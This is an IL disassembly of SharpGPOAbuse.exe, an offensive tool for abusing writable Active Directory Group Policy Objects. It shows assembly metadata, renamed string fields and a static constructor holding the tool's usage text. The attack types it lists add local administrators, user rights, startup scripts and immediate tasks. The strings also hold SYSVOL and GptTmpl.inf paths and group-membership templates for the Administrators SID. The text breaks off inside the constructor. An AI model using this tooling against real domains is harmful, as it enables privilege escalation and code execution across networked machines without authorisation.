
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.DirectoryServices
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.DirectoryServices.Protocols
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System.DirectoryServices.AccountManagement
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.Core
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly SharpGPOAbuse
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 36 2E 31 01   // ,Version=v4.6.1.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 36 2E 31 )          // amework 4.6.1
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. 
                                                                                                  20 32 30 31 39 00 00 )                            //  2019..
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 34 66 34 39 35 37 38 34 2D 62 34 34 33   // ..$4f495784-b443
                                                                                                  2D 34 38 33 38 2D 39 66 61 36 2D 39 31 34 39 32   // -4838-9fa6-91492
                                                                                                  39 33 61 66 37 38 35 00 00 )                      // 93af785..
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 0D 53 68 61 72 70 47 50 4F 41 62 75 73 65   // ...SharpGPOAbuse
                                                                                              00 00 ) 

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 0D 53 68 61 72 70 47 50 4F 41 62 75 73 65   // ...SharpGPOAbuse
                                                                                                00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module SharpGPOAbuse.exe
// MVID: {08293D21-34F8-4D1A-B30C-ACA39CD91830}
.imagebase 0x0000000000400000
.file alignment 0x00000200
.stackreserve 0x0000000000100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x00BF0000


// ================== GLOBAL FIELDS ==========================

.field public static string FXAssembly
.field public static string ThisAssembly
.field public static string AssemblyRef
.field public static string __Canon
.field public static string ICloneable
.field public static string IEnumerable
.field public static string ICollection
.field public static string IList
.field public static string Array
.field public static string IComparer`1
.field public static string ValueType
.field public static string IEnumerator
.field public static string SZArrayHelper
.field public static string IDisposable
.field public static string IEnumerator`1
.field public static string ArraySegment`1
.field public static string IComparable
.field public static string IComparable`1
.field public static string IEquatable`1
.field public static string ThrowHelper
.field public static string IFormattable
.field public static string IConvertible
.field public static string Enum
.field public static string ExceptionArgument
.field public static string ExceptionResource
.field public static string IEnumerable`1
.field public static string String
.field public static string StringSplitOptions
.field public static string IComparer
.field public static string IEqualityComparer
.field public static string IEqualityComparer`1
.field public static string StringComparer
.field public static string CultureAwareComparer
.field public static string OrdinalComparer
.field public static string StringComparison
.field public static string ISerializable
.field public static string StringBuilder
.field public static string _Exception
.field public static string Exception
.field public static string DateTime
.field public static string DateTimeKind
.field public static string IDeserializationCallback
.field public static string DateTimeOffset
.field public static string SystemException
.field public static string OutOfMemoryException
.field public static string StackOverflowException
.field public static string DataMisalignedException
.field public static string ExecutionEngineException
.field public static string Delegate
.field public static string DelegateBindingFlags
.field public static string MulticastDelegate
.field public static string __Filters
.field public static string __HResults
.field public static string LogLevel
.field public static string SwitchStructure
.field public static string BCLDebug
.field public static string MemberAccessException
.field public static string _Activator
.field public static string Activator
.field public static string AccessViolationException
.field public static string ManifestRunner
.field public static string ApplicationActivator
.field public static string ApplicationException
.field public static string EventArgs
.field public static string ResolveEventArgs
.field public static string AssemblyLoadEventArgs
.field public static string ResolveEventHandler
.field public static string AssemblyLoadEventHandler
.field public static string AppDomainInitializer
.field public static string AppDomainInitializerInfo
.field public static string MarshalByRefObject
.field public static string _AppDomain
.field public static string IEvidenceFactory
.field public static string AppDomain
.field public static string CrossAppDomainDelegate
.field public static string AppDomainManagerInitializationOptions
.field public static string AppDomainManager
.field public static string IAppDomainSetup
.field public static string AppDomainSetup
.field public static string LoaderOptimization
.field public static string _Attribute
.field public static string Attribute
.field public static string LoaderOptimizationAttribute
.field public static string AppDomainUnloadedException
.field public static string ActivationArguments
.field public static string ActivationContext
.field public static string ApplicationIdentity
.field public static string InternalApplicationIdentityHelper
.field public static string InternalActivationContextHelper
.field public static string ApplicationId
.field public static string ArgumentException
.field public static string ArgumentNullException
.field public static string ArgumentOutOfRangeException
.field public static string ArgIterator
.field public static string ArithmeticException
.field public static string ArrayTypeMismatchException
.field public static string AsyncCallback
.field public static string AttributeTargets
.field public static string AttributeUsageAttribute
.field public static string BadImageFormatException
.field public static string BitConverter
.field public static string Boolean
.field public static string Buffer
.field public static string Byte
.field public static string CannotUnloadAppDomainException
.field public static string Char
.field public static string CharEnumerator
.field public static string ConfigEvents
.field public static string ConfigNodeType
.field public static string ConfigNodeSubType
.field public static string IConfigHandler
.field public static string ConfigServer
.field public static string ConfigTreeParser
.field public static string ConfigNode
.field public static string CLSCompliantAttribute
.field public static string TypeUnloadedException
.field public static string _Thread
.field public static string __ComObject
.field public static string CompatibilityFlag
.field public static string Console
.field public static string CriticalFinalizerObject
.field public static string ConsoleCancelEventHandler
.field public static string ConsoleCancelEventArgs
.field public static string ConsoleColor
.field public static string ConsoleKey
.field public static string ConsoleKeyInfo
.field public static string ConsoleModifiers
.field public static string ConsoleSpecialKey
.field public static string ContextMarshalException
.field public static string Convert
.field public static string Base64FormattingOptions
.field public static string ContextBoundObject
.field public static string ContextStaticAttribute
.field public static string StringFreezingAttribute
.field public static string Currency
.field public static string TimeZone
.field public static string CurrentSystemTimeZone
.field public static string DayOfWeek
.field public static string DBNull
.field public static string Decimal
.field public static string Binder
.field public static string DefaultBinder
.field public static string IObjectReference
.field public static string DelegateSerializationHolder
.field public static string DivideByZeroException
.field public static string Double
.field public static string DuplicateWaitObjectException
.field public static string Empty
.field public static string TypeLoadException
.field public static string EntryPointNotFoundException
.field public static string DllNotFoundException
.field public static string EnvironmentVariableTarget
.field public static string Environment
.field public static string EventHandler
.field public static string EventHandler`1
.field public static string FieldAccessException
.field public static string FlagsAttribute
.field public static string FormatException
.field public static string GCCollectionMode
.field public static string GCNotificationStatus
.field public static string GC
.field public static string Guid
.field public static string IAsyncResult
.field public static string ICustomFormatter
.field public static string IFormatProvider
.field public static string IndexOutOfRangeException
.field public static string InsufficientMemoryException
.field public static string Int16
.field public static string Int32
.field public static string Int64
.field public static string IntPtr
.field public static string Internal
.field public static string InvalidCastException
.field public static string InvalidOperationException
.field public static string InvalidProgramException
.field public static string IServiceProvider
.field public static string LocalDataStore
.field public static string LdsSyncHelper
.field public static string LocalDataStoreSlot
.field public static string LocalDataStoreMgr
.field public static string Math
.field public static string Mda
.field public static string MethodAccessException
.field public static string MidpointRounding
.field public static string MissingMemberException
.field public static string MissingFieldException
.field public static string MissingMethodException
.field public static string MulticastNotSupportedException
.field public static string NonSerializedAttribute
.field public static string NotFiniteNumberException
.field public static string NotImplementedException
.field public static string NotSupportedException
.field public static string NullReferenceException
.field public static string Number
.field public static string ObjectDisposedException
.field public static string ObsoleteAttribute
.field public static string OleAutBinder
.field public static string OperatingSystem
.field public static string OperationCanceledException
.field public static string OverflowException
.field public static string ParamArrayAttribute
.field public static string ParseNumbers
.field public static string PlatformID
.field public static string PlatformNotSupportedException
.field public static string Random
.field public static string RankException
.field public static string ResId
.field public static string CtorDelegate
.field public static string ICustomAttributeProvider
.field public static string _MemberInfo
.field public static string MemberInfo
.field public static string _Type
.field public static string IReflect
.field public static string Type
.field public static string RuntimeType
.field public static string ReflectionOnlyType
.field public static string CerArrayList`1
.field public static string CerHashtable`2
.field public static string Utf8String
.field public static string ASSERT
.field public static string LOGIC
.field public static string RuntimeArgumentHandle
.field public static string RuntimeTypeHandle
.field public static string RuntimeMethodHandle
.field public static string RuntimeFieldHandle
.field public static string AssemblyHandle
.field public static string ModuleHandle
.field public static string Signature
.field public static string SignatureStruct
.field public static string Resolver
.field public static string SByte
.field public static string SerializableAttribute
.field public static string SharedStatics
.field public static string Single
.field public static string TimeoutException
.field public static string TimeSpan
.field public static string TypeCode
.field public static string TypedReference
.field public static string TypeInitializationException
.field public static string UInt16
.field public static string UInt32
.field public static string UInt64
.field public static string UIntPtr
.field public static string UnauthorizedAccessException
.field public static string UnitySerializationHolder
.field public static string UnhandledExceptionEventArgs
.field public static string UnhandledExceptionEventHandler
.field public static string UnSafeCharBuffer
.field public static string Variant
.field public static string Version
.field public static string Void
.field public static string WeakReference
.field public static string XmlIgnoreMemberAttribute
.field public static string AbandonedMutexException
.field public static string WaitHandle
.field public static string EventWaitHandle
.field public static string AutoResetEvent
.field public static string SynchronizationContextSwitcher
.field public static string SendOrPostCallback
.field public static string SynchronizationContextProperties
.field public static string SynchronizationContext
.field public static string CompressedStackSwitcher
.field public static string SafeHandle
.field public static string SafeCompressedStackHandle
.field public static string CompressedStack
.field public static string DomainCompressedStack
.field public static string EventResetMode
.field public static string ExceptionType
.field public static string WaitDelegate
.field public static string ExecutionContextSwitcher
.field public static string AsyncFlowControl
.field public static string ContextCallback
.field public static string ExecutionContext
.field public static string Interlocked
.field public static string IObjectHandle
.field public static string HostExecutionContextSwitcher
.field public static string HostExecutionContext
.field public static string IUnknownSafeHandle
.field public static string HostExecutionContextManager
.field public static string LockCookie
.field public static string ManualResetEvent
.field public static string Monitor
.field public static string Mutex
.field public static string NativeOverlapped
.field public static string _IOCompletionCallback
.field public static string OverlappedData
.field public static string Overlapped
.field public static string OverlappedDataCacheLine
.field public static string OverlappedDataCache
.field public static string ParameterizedThreadStart
.field public static string ReaderWriterLock
.field public static string SynchronizationLockException
.field public static string InternalCrossContextDelegate
.field public static string ThreadHelper
.field public static string Thread
.field public static string StackCrawlMark
.field public static string ThreadAbortException
.field public static string ThreadInterruptedException
.field public static string ThreadPoolGlobals
.field public static string ThreadPoolRequestQueue
.field public static string RegisteredWaitHandleSafe
.field public static string RegisteredWaitHandle
.field public static string WaitCallback
.field public static string WaitOrTimerCallback
.field public static string _ThreadPoolWaitCallback
.field public static string _ThreadPoolWaitOrTimerCallback
.field public static string IOCompletionCallback
.field public static string ThreadPool
.field public static string ThreadPriority
.field public static string ThreadStart
.field public static string ThreadState
.field public static string ThreadStateException
.field public static string ThreadStaticAttribute
.field public static string ThreadStartException
.field public static string Timeout
.field public static string _TimerCallback

// =============================================================


// ================== GLOBAL METHODS =========================

.method private hidebysig specialname rtspecialname static 
        void  .cctor() cil managed
{
  // Code size       3161 (0xc59)
  .maxstack  1
  IL_0000:  ldstr      "\nUsage: \n\tSharpGPOAbuse.exe <AttackType> <AttackOp"
  + "tions>\n\nAttack Types:\n--AddUserRights\n\tAdd rights to a user account\n--A"
  + "ddLocalAdmin\n\tAdd a new local admin. This will replace any existing loc"
  + "al admins!\n--AddComputerScript\n\tAdd a new computer startup script\n--Add"
  + "UserScript\n\tAdd a new user startup script\n--AddComputerTask\n\tAdd a new "
  + "computer immediate task\n--AddUserTask\n\tAdd a new user immediate task\n\n\n"
  + "Options required to add a new local admin:\n--UserAccount\n\tSet the name "
  + "of the account to be added in local admins.\n--GPOName\n\tThe name of the "
  + "vulnerable GPO.\n\n\nOptions required to add a new user startup script:\n--"
  + "ScriptName\n\tSet the name of the new startup script.\n--ScriptContents\n\tS"
  + "et the contents of the new startup script.\n--GPOName\n\tThe name of the v"
  + "ulnerable GPO.\n\n\nOptions required to add a new computer startup script:"
  + "\n--ScriptName\n\tSet the name of the new startup script.\n--ScriptContents"
  + "\n\tSet the contents of the new startup script.\n--GPOName\n\tThe name of th"
  + "e vulnerable GPO.\n\n\nOptions required to add new user rights:\n--UserRigh"
  + "ts\n\tSet the new rights to add to a user. This option is case sensitive "
  + "and a comma separeted list must be used.\n--UserAccount\n\tSet the account"
  + " to add the new rights.\n--GPOName\n\tThe name of the vulnerable GPO.\n\n\nOp"
  + "tions required to add a new computer immediate task:\n--TaskName\n\tSet th"
  + "e name of the new computer task.\n--Author\n\tSet the author of the new ta"
  + "sk (use a DA account).\n--Command\n\tCommand to execute.\n--Arguments\n\tArgu"
  + "ments passed to the command.\n--GPOName\n\tThe name of the vulnerable GPO."
  + "\n\n\nOptions required to add a new user immediate task:\n--TaskName\n\tSet t"
  + "he name of the user new task.\n--Author\n\tSet the author of the new task "
  + "(use a DA account).\n--Command\n\tCommand to execute.\n--Arguments\n\tArgumen"
  + "ts passed to the command.\n--GPOName\n\tThe name of the vulnerable GPO.\n\n\n"
  + "Other options:\n--DomainController\n\tSet the target domain controller.\n--"
  + "Domain\n\tSet the target domain.\n--Force\n\tOverwrite existing files if req"
  + "uired.\n\n"
  IL_0005:  stsfld     string FXAssembly
  IL_000a:  ldstr      ""
  IL_000f:  stsfld     string ThisAssembly
  IL_0014:  ldstr      "[-] Could not find GPT.ini. The group policy might"
  + " need to be updated manually using 'gpupdate /force'"
  IL_0019:  stsfld     string AssemblyRef
  IL_001e:  ldstr      "LDAP://"
  IL_0023:  stsfld     string __Canon
  IL_0028:  ldstr      "(displayName="
  IL_002d:  stsfld     string ICloneable
  IL_0032:  ldstr      ")"
  IL_0037:  stsfld     string IEnumerable
  IL_003c:  ldstr      "Computer"
  IL_0041:  stsfld     string ICollection
  IL_0046:  ldstr      "versionNumber"
  IL_004b:  stsfld     string IList
  IL_0050:  ldstr      "gPCMachineExtensionNames"
  IL_0055:  stsfld     string Array
  IL_005a:  ldstr      "gPCMachineExtensionNames"
  IL_005f:  stsfld     string IComparer`1
  IL_0064:  ldstr      "versionNumber"
  IL_0069:  stsfld     string ValueType
  IL_006e:  ldstr      "gPCUserExtensionNames"
  IL_0073:  stsfld     string IEnumerator
  IL_0078:  ldstr      "gPCUserExtensionNames"
  IL_007d:  stsfld     string SZArrayHelper
  IL_0082:  ldstr      "[!] Exiting..."
  IL_0087:  stsfld     string IDisposable
  IL_008c:  ldstr      "Computer"
  IL_0091:  stsfld     string IEnumerator`1
  IL_0096:  ldstr      "versionNumber"
  IL_009b:  stsfld     string ArraySegment`1
  IL_00a0:  ldstr      "versionNumber"
  IL_00a5:  stsfld     string IComparable
  IL_00aa:  ldstr      "versionNumber"
  IL_00af:  stsfld     string IComparable`1
  IL_00b4:  ldstr      "versionNumber"
  IL_00b9:  stsfld     string IEquatable`1
  IL_00be:  ldstr      ""
  IL_00c3:  stsfld     string ThrowHelper
  IL_00c8:  ldstr      ""
  IL_00cd:  stsfld     string IFormattable
  IL_00d2:  ldstr      "AddLocalAdmin"
  IL_00d7:  stsfld     string IConvertible
  IL_00dc:  ldstr      "AddNewRights"
  IL_00e1:  stsfld     string Enum
  IL_00e6:  ldstr      "NewStartupScript"
  IL_00eb:  stsfld     string ExceptionArgument
  IL_00f0:  ldstr      "AddLocalAdmin"
  IL_00f5:  stsfld     string ExceptionResource
  IL_00fa:  ldstr      "AddNewRights"
  IL_00ff:  stsfld     string IEnumerable`1
  IL_0104:  ldstr      "827D319E-6EAC-11D2-A4EA-00C04F79F83A"
  IL_0109:  stsfld     string String
  IL_010e:  ldstr      "803E14A0-B4FB-11D0-A0D0-00A0C90F574B"
  IL_0113:  stsfld     string StringSplitOptions
  IL_0118:  ldstr      "NewStartupScript"
  IL_011d:  stsfld     string IComparer
  IL_0122:  ldstr      "42B5FAAE-6536-11D2-AE5A-0000F87571E3"
  IL_0127:  stsfld     string IEqualityComparer
  IL_012c:  ldstr      "40B6664F-4972-11D1-A7CA-0000F87571E3"
  IL_0131:  stsfld     string IEqualityComparer`1
  IL_0136:  ldstr      "{"
  IL_013b:  stsfld     string StringComparer
  IL_0140:  ldstr      ""
  IL_0145:  stsfld     string CultureAwareComparer
  IL_014a:  ldstr      "}"
  IL_014f:  stsfld     string OrdinalComparer
  IL_0154:  ldstr      " "
  IL_0159:  stsfld     string StringComparison
  IL_015e:  ldstr      "]"
  IL_0163:  stsfld     string ISerializable
  IL_0168:  ldstr      ""
  IL_016d:  stsfld     string StringBuilder
  IL_0172:  ldstr      " "
  IL_0177:  stsfld     string _Exception
  IL_017c:  ldstr      ""
  IL_0181:  stsfld     string Exception
  IL_0186:  ldstr      "{"
  IL_018b:  stsfld     string DateTime
  IL_0190:  ldstr      "}"
  IL_0195:  stsfld     string DateTimeKind
  IL_019a:  ldstr      "["
  IL_019f:  stsfld     string IDeserializationCallback
  IL_01a4:  ldstr      "]"
  IL_01a9:  stsfld     string DateTimeOffset
  IL_01ae:  ldstr      ""
  IL_01b3:  stsfld     string SystemException
  IL_01b8:  ldstr      " "
  IL_01bd:  stsfld     string OutOfMemoryException
  IL_01c2:  ldstr      "{"
  IL_01c7:  stsfld     string StackOverflowException
  IL_01cc:  ldstr      ""
  IL_01d1:  stsfld     string DataMisalignedException
  IL_01d6:  ldstr      "}"
  IL_01db:  stsfld     string ExecutionEngineException
  IL_01e0:  ldstr      " "
  IL_01e5:  stsfld     string Delegate
  IL_01ea:  ldstr      "]"
  IL_01ef:  stsfld     string DelegateBindingFlags
  IL_01f4:  ldstr      ""
  IL_01f9:  stsfld     string MulticastDelegate
  IL_01fe:  ldstr      ""
  IL_0203:  stsfld     string __Filters
  IL_0208:  ldstr      "{"
  IL_020d:  stsfld     string __HResults
  IL_0212:  ldstr      "}"
  IL_0217:  stsfld     string LogLevel
  IL_021c:  ldstr      "["
  IL_0221:  stsfld     string SwitchStructure
  IL_0226:  ldstr      "]"
  IL_022b:  stsfld     string BCLDebug
  IL_0230:  ldstr      ""
  IL_0235:  stsfld     string MemberAccessException
  IL_023a:  ldstr      "[{"
  IL_023f:  stsfld     string _Activator
  IL_0244:  ldstr      "}{"
  IL_0249:  stsfld     string Activator
  IL_024e:  ldstr      "}]"
  IL_0253:  stsfld     string AccessViolationException
  IL_0258:  ldstr      "NewImmediateTask"
  IL_025d:  stsfld     string ManifestRunner
  IL_0262:  ldstr      "00000000-0000-0000-0000-000000000000"
  IL_0267:  stsfld     string ApplicationActivator
  IL_026c:  ldstr      "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
  IL_0271:  stsfld     string ApplicationException
  IL_0276:  ldstr      "AADCED64-746C-4633-A97C-D61349046527"
  IL_027b:  stsfld     string EventArgs
  IL_0280:  ldstr      "{"
  IL_0285:  stsfld     string ResolveEventArgs
  IL_028a:  ldstr      ""
  IL_028f:  stsfld     string AssemblyLoadEventArgs
  IL_0294:  ldstr      "}"
  IL_0299:  stsfld     string ResolveEventHandler
  IL_029e:  ldstr      " "
  IL_02a3:  stsfld     string AssemblyLoadEventHandler
  IL_02a8:  ldstr      "]"
  IL_02ad:  stsfld     string AppDomainInitializer
  IL_02b2:  ldstr      ""
  IL_02b7:  stsfld     string AppDomainInitializerInfo
  IL_02bc:  ldstr      " "
  IL_02c1:  stsfld     string MarshalByRefObject
  IL_02c6:  ldstr      " "
  IL_02cb:  stsfld     string _AppDomain
  IL_02d0:  ldstr      " "
  IL_02d5:  stsfld     string IEvidenceFactory
  IL_02da:  ldstr      " "
  IL_02df:  stsfld     string AppDomain
  IL_02e4:  ldstr      ""
  IL_02e9:  stsfld     string CrossAppDomainDelegate
  IL_02ee:  ldstr      "{"
  IL_02f3:  stsfld     string AppDomainManagerInitializationOptions
  IL_02f8:  ldstr      "}"
  IL_02fd:  stsfld     string AppDomainManager
  IL_0302:  ldstr      "["
  IL_0307:  stsfld     string IAppDomainSetup
  IL_030c:  ldstr      "]"
  IL_0311:  stsfld     string AppDomainSetup
  IL_0316:  ldstr      ""
  IL_031b:  stsfld     string LoaderOptimization
  IL_0320:  ldstr      "[{"
  IL_0325:  stsfld     string _Attribute
  IL_032a:  ldstr      "}{"
  IL_032f:  stsfld     string Attribute
  IL_0334:  ldstr      "}][{"
  IL_0339:  stsfld     string LoaderOptimizationAttribute
  IL_033e:  ldstr      "}{"
  IL_0343:  stsfld     string AppDomainUnloadedException
  IL_0348:  ldstr      "}]"
  IL_034d:  stsfld     string ActivationArguments
  IL_0352:  ldstr      "[+] versionNumber attribute changed successfully"
  IL_0357:  stsfld     string ActivationContext
  IL_035c:  ldstr      "[!] Could not update versionNumber attribute!\nExit"
  + "ing..."
  IL_0361:  stsfld     string ApplicationIdentity
  IL_0366:  ldstr      "[!] GPO not found!\nExiting..."
  IL_036b:  stsfld     string InternalApplicationIdentityHelper
  IL_0370:  ldstr      " "
  IL_0375:  stsfld     string InternalActivationContextHelper
  IL_037a:  ldstr      ""
  IL_037f:  stsfld     string ApplicationId
  IL_0384:  ldstr      "Version="
  IL_0389:  stsfld     string ArgumentException
  IL_038e:  ldstr      "Version="
  IL_0393:  stsfld     string ArgumentNullException
  IL_0398:  ldstr      "[+] The version number in GPT.ini was increased su"
  + "ccessfully."
  IL_039d:  stsfld     string ArgumentOutOfRangeException
  IL_03a2:  ldstr      "AddLocalAdmin"
  IL_03a7:  stsfld     string ArgIterator
  IL_03ac:  ldstr      "[+] The GPO was modified to include a new local ad"
  + "min. Wait for the GPO refresh cycle.\n[+] Done!"
  IL_03b1:  stsfld     string ArithmeticException
  IL_03b6:  ldstr      "NewStartupScript"
  IL_03bb:  stsfld     string ArrayTypeMismatchException
  IL_03c0:  ldstr      "[+] The GPO was modified to include a new startup "
  + "script. Wait for the GPO refresh cycle.\n[+] Done!"
  IL_03c5:  stsfld     string AsyncCallback
  IL_03ca:  ldstr      "NewImmediateTask"
  IL_03cf:  stsfld     string AttributeTargets
  IL_03d4:  ldstr      "[+] The GPO was modified to include a new immediat"
  + "e task. Wait for the GPO refresh cycle.\n[+] Done!"
  IL_03d9:  stsfld     string AttributeUsageAttribute
  IL_03de:  ldstr      "AddNewRights"
  IL_03e3:  stsfld     string BadImageFormatException
  IL_03e8:  ldstr      "[+] The GPO was modified to assign new rights to t"
  + "arget user. Wait for the GPO refresh cycle.\n[+] Done!"
  IL_03ed:  stsfld     string BitConverter
  IL_03f2:  ldstr      "(displayName="
  IL_03f7:  stsfld     string Boolean
  IL_03fc:  ldstr      ")"
  IL_0401:  stsfld     string Buffer
  IL_0406:  ldstr      ""
  IL_040b:  stsfld     string Byte
  IL_0410:  ldstr      "cn"
  IL_0415:  stsfld     string CannotUnloadAppDomainException
  IL_041a:  ldstr      "[!] Could not retrieve the GPO GUID. The GPO Name "
  + "was invalid. \n[-] Exiting..."
  IL_041f:  stsfld     string Char
  IL_0424:  ldstr      "[!] Could not retrieve the GPO GUID. The GPO Name "
  + "was invalid. \n[-] Exiting..."
  IL_0429:  stsfld     string CharEnumerator
  IL_042e:  ldstr      "[+] GUID of \""
  IL_0433:  stsfld     string ConfigEvents
  IL_0438:  ldstr      "\" is: "
  IL_043d:  stsfld     string ConfigNodeType
  IL_0442:  ldstr      "[+] SID Value of "
  IL_0447:  stsfld     string ConfigNodeSubType
  IL_044c:  ldstr      " = "
  IL_0451:  stsfld     string IConfigHandler
  IL_0456:  ldstr      "[-] Could not find user \""
  IL_045b:  stsfld     string ConfigServer
  IL_0460:  ldstr      "\" in the "
  IL_0465:  stsfld     string ConfigTreeParser
  IL_046a:  ldstr      " domain.\n[-] Exiting...\n"
  IL_046f:  stsfld     string ConfigNode
  IL_0474:  ldstr      "[Unicode]\r\nUnicode=yes\r\n[Version]\r\nsignature=\"$CHI"
  + "CAGO$\"\r\nRevision=1"
  IL_0479:  stsfld     string CLSCompliantAttribute
  IL_047e:  ldstr      "[Group Membership]"
  IL_0483:  stsfld     string TypeUnloadedException
  IL_0488:  ldstr      "*S-1-5-32-544__Memberof ="
  IL_048d:  stsfld     string _Thread
  IL_0492:  ldstr      "*S-1-5-32-544__Members = *"
  IL_0497:  stsfld     string __ComObject
  IL_049c:  ldstr      "\\\\"
  IL_04a1:  stsfld     string CompatibilityFlag
  IL_04a6:  ldstr      "\\SysVol\\"
  IL_04ab:  stsfld     string Console
  IL_04b0:  ldstr      "\\Policies\\"
  IL_04b5:  stsfld     string CriticalFinalizerObject
  IL_04ba:  ldstr      "\\GPT.ini"
  IL_04bf:  stsfld     string ConsoleCancelEventHandler
  IL_04c4:  ldstr      "\\Machine\\Microsoft\\Windows NT\\SecEdit\\"
  IL_04c9:  stsfld     string ConsoleCancelEventArgs
  IL_04ce:  ldstr      "[!] Could not find the specified GPO!\nExiting..."
  IL_04d3:  stsfld     string ConsoleColor
  IL_04d8:  ldstr      "GptTmpl.inf"
  IL_04dd:  stsfld     string ConsoleKey
  IL_04e2:  ldstr      "[+] File exists: "
  IL_04e7:  stsfld     string ConsoleKeyInfo
  IL_04ec:  ldstr      "[Group Membership]"
  IL_04f1:  stsfld     string ConsoleModifiers
  IL_04f6:  ldstr      "[!] Group Memberships are already defined in the G"
  + "PO. Use --force to make changes. This option might break the affected s"
  + "ystems!\n[-] Exiting..."
  IL_04fb:  stsfld     string ConsoleSpecialKey
  IL_0500:  ldstr      " "
  IL_0505:  stsfld     string ContextMarshalException
  IL_050a:  ldstr      ""
  IL_050f:  stsfld     string Convert
  IL_0514:  ldstr      "*S-1-5-32-544__Members="
  IL_0519:  stsfld     string Base64FormattingOptions
  IL_051e:  ldstr      " "
  IL_0523:  stsfld     string ContextBoundObject
  IL_0528:  ldstr      ""
  IL_052d:  stsfld     string ContextStaticAttribute
  IL_0532:  ldstr      "*S-1-5-32-544__Members="
  IL_0537:  stsfld     string StringFreezingAttribute
  IL_053c:  ldstr      " "
  IL_0541:  stsfld     string Currency
  IL_0546:  ldstr      ""
  IL_054b:  stsfld     string TimeZone
  IL_0550:  ldstr      "*S-1-5-32-544__Members="
  IL_0555:  stsfld     string CurrentSystemTimeZone
  IL_055a:  ldstr      ", *"
  IL_055f:  stsfld     string DayOfWeek
  IL_0564:  ldstr      " "
  IL_0569:  stsfld     string DBNull
  IL_056e:  ldstr      ""
  IL_0573:  stsfld     string Decimal
  IL_0578:  ldstr      "*S-1-5-32-544__Members="
  IL_057d:  stsfld     string Binder
  IL_0582:  ldstr      " "
  IL_0587:  stsfld     string DefaultBinder
  IL_058c:  ldstr      ""
  IL_0591:  stsfld     string IObjectReference
  IL_0596:  ldstr      "*S-1-5-32-544__Members="
  IL_059b:  stsfld     string DelegateSerializationHolder
  IL_05a0:  ldstr      " *"
  IL_05a5:  stsfld     string DivideByZeroException
  IL_05aa:  ldstr      "AddLocalAdmin"
  IL_05af:  stsfld     string Double
  IL_05b4:  ldstr      "Computer"
  IL_05b9:  stsfld     string DuplicateWaitObjectException
  IL_05be:  ldstr      "[+] The GPO does not specify any group memberships."
  IL_05c3:  stsfld     string Empty
  IL_05c8:  ldstr      "AddLocalAdmin"
  IL_05cd:  stsfld     string TypeLoadException
  IL_05d2:  ldstr      "Computer"
  IL_05d7:  stsfld     string EntryPointNotFoundException
  IL_05dc:  ldstr      "[+] Creating file "
  IL_05e1:  stsfld     string DllNotFoundException
  IL_05e6:  ldstr      "AddLocalAdmin"
  IL_05eb:  stsfld     string EnvironmentVariableTarget
  IL_05f0:  ldstr      "Computer"
  IL_05f5:  stsfld     string Environment
  IL_05fa:  ldstr      "\\\\"
  IL_05ff:  stsfld     string EventHandler
  IL_0604:  ldstr      "\\SysVol\\"
  IL_0609:  stsfld     string EventHandler`1
  IL_060e:  ldstr      "\\Policies\\"
  IL_0613:  stsfld     string FieldAccessException
